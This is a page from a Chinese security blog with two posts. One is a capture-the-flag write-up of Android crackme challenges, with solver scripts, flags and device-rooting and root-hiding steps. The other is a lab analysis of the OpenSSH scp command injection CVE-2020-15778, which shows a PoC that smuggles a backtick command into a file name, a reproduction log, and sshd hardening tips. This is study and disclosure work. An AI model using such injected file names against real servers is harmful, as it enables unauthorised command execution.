+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/" class="post-title-link" itemprop="url">攻防世界（MOBILE）writeup</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-16 09:31:33" itemprop="dateCreated datePublished" datetime="2022-03-16T09:31:33+08:00">2022-03-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-04 23:37:58" itemprop="dateModified" datetime="2022-05-04T23:37:58+08:00">2022-05-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h2><p>使用过程中，可以使用<strong>scrcpy</strong>，在电脑端可以操作手机</p>
+<h3 id="新手练习区"><a href="#新手练习区" class="headerlink" title="新手练习区"></a>新手练习区</h3><h4 id="001-RememberOther"><a href="#001-RememberOther" class="headerlink" title="001 RememberOther"></a>001 RememberOther</h4><p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220316095539101.png" alt="image-20220316095539101"></p>
+<p>比较简单的Crackme，jeb反编译</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220316101544781.png" alt="image-20220316101544781"></p>
+<p>查看checkSN函数</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220316102116327.png" alt="image-20220316102116327"></p>
+<p>总结来说，为了获取索引0x7F05000B，有三种方式</p>
+<ul>
+<li><p>直接查看资源文件</p>
+</li>
+<li><p>空值注册，注意截图</p>
+</li>
+<li><p>对该算法进行解码，生成复合要求的两个参数</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">arg</span>):</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(arg.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    arg2hexstr = hl.hexdigest()</span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    length = <span class="built_in">len</span>(arg2hexstr)</span><br><span class="line"></span><br><span class="line">    cursor = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> cursor &gt; length - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ret += arg2hexstr[cursor]</span><br><span class="line">        cursor += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>
+
+<p>对md5值进行在线解密：</p>
+<p>b3241668ecbeb19921fdac5ac1aafa69：YOU_KNOW_</p>
+<h4 id="002-app1"><a href="#002-app1" class="headerlink" title="002 app1"></a>002 app1</h4><p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220316111510263.png" alt="image-20220316111510263"></p>
+<p>jeb反编译</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220316120056763.png" alt="image-20220316120056763"></p>
+<p>可以知道：v1=v3^v4，v3=v2.versionName，v4=v2.versionCode</p>
+<p>在BuildConfig类中，找到了相关信息</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220316124455473.png" alt="image-20220316124455473"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">versionCode = <span class="number">15</span></span><br><span class="line">versionName = <span class="string">&#x27;X&lt;cP[?PHNB&lt;P?aj&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> versionName:</span><br><span class="line">    flag += <span class="built_in">chr</span>(versionCode ^ <span class="built_in">ord</span>(char))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>Flag：W3l_T0_GAM3_0ne</p>
+<h4 id="003-app2（未完成）"><a href="#003-app2（未完成）" class="headerlink" title="003 app2（未完成）"></a>003 app2（未完成）</h4><p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220317220323686.png" alt="image-20220317220323686"></p>
+<p>jeb反编译，发现输入后会跳转到SecondAcitvity，继续查看</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220317220405422.png" alt="image-20220317220405422"></p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220317220504851.png" alt="image-20220317220504851"></p>
+<p>通过intent参数传递，得到了v1，v2，关键在于这里的Encryto类，跟进</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220317222557107.png" alt="image-20220317222557107"></p>
+<p>ida查看该库</p>
+<h4 id="004-Ph0en1x-100"><a href="#004-Ph0en1x-100" class="headerlink" title="004 Ph0en1x-100"></a>004 Ph0en1x-100</h4><p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220321032455905.png" alt="image-20220321032455905"></p>
+<p>jeb查看</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220321033513285.png" alt="image-20220321033513285"></p>
+<p>这里外层都有getSecret()函数，只需要查看内层函数：getFlag()、encrypt()，这两个函数由库文件<strong>libphcm.so</strong>引入</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220321033713413.png" alt="image-20220321033713413"></p>
+<p>ida查看libphcm</p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220321122245362.png" alt="image-20220321122245362"></p>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220321122332230.png" alt="image-20220321122332230"></p>
+<p>关于getFlag()的结果，可以调试查看，使用</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在学习的过程中，由于debug的需要，刷入了魔趣的rom（userdebug版本）、magisk、lsposed，这里简单记录一下刷机过程</p>
+<ol>
+<li>魔趣官方下载rom，我的设备Nexus 5X：<a target="_blank" rel="noopener" href="https://download.mokeedev.com/bullhead.html">https://download.mokeedev.com/bullhead.html</a></li>
+<li>刷入twrp：<a target="_blank" rel="noopener" href="https://dl.twrp.me/bullhead/twrp-3.3.1-0-bullhead.img.html">https://dl.twrp.me/bullhead/twrp-3.3.1-0-bullhead.img.html</a></li>
+</ol>
+<p>fastboot状态下刷入：<code>fastboot flash recovery Downloads/twrp-3.3.1-0-bullhead.img</code></p>
+<ol start="3">
+<li>进入recovery模式，双清后线刷，刷入魔趣rom与magisk</li>
+</ol>
+<p><code>adb sideload MK81.0-bullhead-200215-HISTORY.zip</code></p>
+<p><code>adb sideload ~/Desktop/Apk/Magisk-v24.3.zip</code>（这里直接将下载的Magisk-v24.3.apk修改后缀即可）</p>
+<ol start="4">
+<li>刷入lsposed：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed#download">https://github.com/LSPosed/LSPosed#download</a></li>
+</ol>
+<p><img src="/2022/03/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%88MOBILE%EF%BC%89writeup/image-20220327153038332.png" alt="image-20220327153038332"></p>
+<ol start="5">
+<li>刷入Shamiko模块进行root隐藏：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed.github.io/releases">https://github.com/LSPosed/LSPosed.github.io/releases</a></li>
+</ol>
+<p>进入magisk进行模块本地安装即可，完成后重启</p>
+<p>一些参考：</p>
+<ul>
+<li>xposed：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Xposed_(%E6%A1%86%E6%9E%B6)">https://zh.wikipedia.org/wiki/Xposed_(%E6%A1%86%E6%9E%B6)</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="尘埃落定">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="尘埃落定的空间站">
+      <meta itemprop="description" content="Stay Hungry, Stay Foolish.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 尘埃落定的空间站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">CVE-2020-15778：鸡肋的OpenSSH注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-13 15:26:13" itemprop="dateCreated datePublished" datetime="2022-03-13T15:26:13+08:00">2022-03-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-03 17:58:06" itemprop="dateModified" datetime="2022-05-03T17:58:06+08:00">2022-05-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>OpenSSH版本8.3p1以及之前的版本存在scp命令注入，由Chinmay Pandya所发现。</p>
+<blockquote>
+<p>Product: Openssh</p>
+<p>Affected Component: SCP</p>
+<p>Vulnerable version: &lt;=openssh-8.3p1</p>
+<p>Fixed version: -</p>
+<p>CVE number: CVE-2020-15778</p>
+<p>Vulnerable line: <a target="_blank" rel="noopener" href="https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989">https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989</a></p>
+<p>Vulnerability type: Comand Injection / Eval injection</p>
+<p>Attack type: Remote attack</p>
+<p>Discloser timelie:</p>
+<ul>
+<li>Issue discovered - 9 Jun 2020</li>
+<li>CVE obtained - 16 Jul 2020</li>
+<li>Vendor notified - 9 Jun 2020</li>
+<li>Vendor acknowledgement received - 9 Jun 2020</li>
+<li>Public disclosure 18 Jul 2020</li>
+</ul>
+</blockquote>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看Chinmay Pandya公布的漏洞信息：</p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313160546372.png" alt="image-20220313160546372"></p>
+<p>当拷贝文件至远程服务器时候，文件路径会拼接scp命令，由于没有对文件名进行过滤，就造成了命令注入。（通过反引号来执行）</p>
+<p>给出的<strong>poc</strong>如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp  /sourcefile remoteserver:&#x27;`touch /tmp/exploit.sh`/targetfile&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>复现</strong></p>
+<p>Remote：Ubuntu18.04，ssh-server开启服务：/etc/init.d/ssh start，OpenSSH_7.6p1</p>
+<p>Local：通过桥接同一网段的主机，OpenSSH_7.9p1, LibreSSL 2.7.3</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scp -v ./exploit.sh parallels@192.168.18.228:<span class="string">&#x27;`touch /tmp/exploit.sh`/2022-03-13&#x27;</span></span><br><span class="line">Executing: program /usr/bin/ssh host 192.168.18.228, user parallels, <span class="built_in">command</span> scp -v -t `touch /tmp/exploit.sh`/2022-03-13</span><br><span class="line">OpenSSH_7.9p1, LibreSSL 2.7.3</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 48: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to 192.168.18.228 [192.168.18.228] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_rsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_dsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_dsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_ecdsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_ecdsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_ed25519 <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_ed25519-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_xmss <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file /Users/tiger/.ssh/id_xmss-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_7.9</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.6</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.6 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to 192.168.18.228:22 as <span class="string">&#x27;parallels&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:aBEc3BUrC8XH4zmpHx9QfbWlkltR6csuE+0ciDIn0sY</span><br><span class="line">debug1: Host <span class="string">&#x27;192.168.18.228&#x27;</span> is known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /Users/tiger/.ssh/known_hosts:2</span><br><span class="line">debug1: rekey after 134217728 blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey after 134217728 blocks</span><br><span class="line">debug1: Will attempt key: /Users/tiger/.ssh/id_rsa</span><br><span class="line">debug1: Will attempt key: /Users/tiger/.ssh/id_dsa</span><br><span class="line">debug1: Will attempt key: /Users/tiger/.ssh/id_ecdsa</span><br><span class="line">debug1: Will attempt key: /Users/tiger/.ssh/id_ed25519</span><br><span class="line">debug1: Will attempt key: /Users/tiger/.ssh/id_xmss</span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Trying private key: /Users/tiger/.ssh/id_rsa</span><br><span class="line">debug1: Trying private key: /Users/tiger/.ssh/id_dsa</span><br><span class="line">debug1: Trying private key: /Users/tiger/.ssh/id_ecdsa</span><br><span class="line">debug1: Trying private key: /Users/tiger/.ssh/id_ed25519</span><br><span class="line">debug1: Trying private key: /Users/tiger/.ssh/id_xmss</span><br><span class="line">debug1: Next authentication method: password</span><br><span class="line">parallels@192.168.18.228<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">debug1: Authentication succeeded (password).</span></span><br><span class="line"><span class="string">Authenticated to 192.168.18.228 ([192.168.18.228]:22).</span></span><br><span class="line"><span class="string">debug1: channel 0: new [client-session]</span></span><br><span class="line"><span class="string">debug1: Requesting no-more-sessions@openssh.com</span></span><br><span class="line"><span class="string">debug1: Entering interactive session.</span></span><br><span class="line"><span class="string">debug1: pledge: network</span></span><br><span class="line"><span class="string">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span></span><br><span class="line"><span class="string">debug1: Sending environment.</span></span><br><span class="line"><span class="string">debug1: Sending env LC_TERMINAL_VERSION = 3.4.15</span></span><br><span class="line"><span class="string">debug1: Sending env LANG = zh_CN.UTF-8</span></span><br><span class="line"><span class="string">debug1: Sending env LC_TERMINAL = iTerm2</span></span><br><span class="line"><span class="string">debug1: Sending command: scp -v -t `touch /tmp/exploit.sh`/2022-03-13</span></span><br><span class="line"><span class="string">Sending file modes: C0644 0 exploit.sh</span></span><br><span class="line"><span class="string">Sink: C0644 0 exploit.sh</span></span><br><span class="line"><span class="string">scp: /2022-03-13: Permission denied</span></span><br><span class="line"><span class="string">debug1: client_input_channel_req: channel 0 rtype exit-status reply 0</span></span><br><span class="line"><span class="string">debug1: channel 0: free: client-session, nchannels 1</span></span><br><span class="line"><span class="string">debug1: fd 0 clearing O_NONBLOCK</span></span><br><span class="line"><span class="string">Transferred: sent 2116, received 2352 bytes, in 0.2 seconds</span></span><br><span class="line"><span class="string">Bytes per second: sent 10434.6, received 11598.4</span></span><br><span class="line"><span class="string">debug1: Exit status 1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>scp.c</strong></p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313173459403.png" alt="image-20220313173459403"></p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313175546261.png" alt="image-20220313175546261"></p>
+<p>scp运行在<strong>local to remote模式下</strong>，传递参数cmd、targ、拼接到&amp;bp中去执行。</p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313181912809.png" alt="image-20220313181912809"></p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313182140256.png" alt="image-20220313182140256"></p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313183026369.png" alt="image-20220313183026369"></p>
+<p>parse_scp_uri()&gt;&gt;parse_scp_uri()将uri进行解析，其中这里targ极为pathp</p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313220202313.png" alt="image-20220313220202313"></p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220313220330262.png" alt="image-20220313220330262"></p>
+<p>整个流程，分为两部分，客户端，服务端：</p>
+<p>client：</p>
+<ol>
+<li>参数解析：main()&gt;&gt;toremote()</li>
+<li>local to remote模式：toremote()-&gt;do_cmd()</li>
+<li>发送需要执行的命令到server端</li>
+</ol>
+<p>server：</p>
+<ol>
+<li>认证通过后执行命令</li>
+<li>这里有-t参数，tflag=1 ，执行sink()函数</li>
+</ol>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>整个过程中并没有绕过ssh认证，利用场景就显得比较苛刻，在commit 中：作者提到了利用场景，不过最后删除了：</p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220314001614980.png" alt="image-20220314001614980"></p>
+<ul>
+<li>场景一：ssh 被禁止时候，通过authorized_key中command option来执行scp</li>
+<li>场景二：-r参数支持目录，Linux中支持带”`”的文件名，可以构造让受害者去执行</li>
+</ul>
+<p><strong>对场景一进行复现</strong></p>
+<p>comand=”command”，在authorized_keys 中添加该选项，限制命令执行，<strong>服务器执行完毕后中断与client连接</strong>，如下执行id命令后关闭连接</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">parallels@ubuntu:~$ cat .ssh/authorized_keys </span><br><span class="line"><span class="built_in">command</span>=<span class="string">&quot;id&quot;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzTE9JTqIObJhBZix6Wq+6arc7NidyqaSAUB6UAEF6+/X0fN0Y2UATYrxZYWBE1UTNJAY8FeIf8J9exwfK+e8RAS5x/Ch6aPu7MyqBWIF7UQUT0Cryv/H5+SumpPZK86bgEXsP4ia5+bslyLvHlZtRH6pBj0Cz+O8mmsDbIX/9oWAf48EG+3t9UY+DG5EQdqNvLjO/PuU5ZYcghaOWYD7CcIC8kPf0TyJVMouW/EKRrKa9WeZzSJRZb/W8rhYSDpv8kgInT9ChP8XkE1/FHCT1mOJk7JWyVCw1hiHaptE4xnGgMHzRLBA0ny/2OmuHOxQqA1hbkX6OHptKNfDNC9Ox parallels@ubuntu</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh parallels@192.168.18.228 -i id_rsa</span><br><span class="line">uid=1000(parallels) gid=1000(parallels) groups=1000(parallels),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">Connection to 192.168.18.228 closed.</span><br></pre></td></tr></table></figure>
+
+<p>配置scp-test用户，添加DenyUsers，发现无法执行命令</p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220314021401129.png" alt="image-20220314021401129"></p>
+<p><img src="/2022/03/13/CVE-2020-15778%EF%BC%9A%E9%B8%A1%E8%82%8B%E7%9A%84OpenSSH%E6%B3%A8%E5%85%A5/image-20220314021427836.png" alt="image-20220314021427836"></p>
+<p>官方最终的修复是：如果你介意，rsync…</p>
+<p><strong>ssh配置上的一些实践</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用root账户登录，非必要，但为了安全性，请配置</span></span><br><span class="line">PermitRootLogin no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否让 sshd 去检查用户家目录或相关档案的权限数据，这是为了担心使用者将某些重要档案的权限设错，可能会导致一些问题所致。例如使用者的 ~/.ssh/ 权限设错时，某些特殊情况下会不许用户登入</span></span><br><span class="line">StrictModes no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否允许用户自行使用成对的密钥系统进行登入行为，仅针对 version 2。至于自制的公钥数据就放置于用户家目录下的 .ssh/authorized_keys 内</span></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile %h/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有了证书登录了，就禁用密码登录吧，安全要紧</span></span><br><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
+
+<p><strong>一些思考</strong></p>
+<ul>
+<li>分析漏洞、原始信息、commit</li>
+<li>工具：sourceinsight4，真不错</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/fab3252b3192">https://www.jianshu.com/p/fab3252b3192</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘埃落定</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js","integrity":"sha256-7wT34TI0pEBeEFoi4z+vhuSddGh6vUTMWdqJ2SDe2jg="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
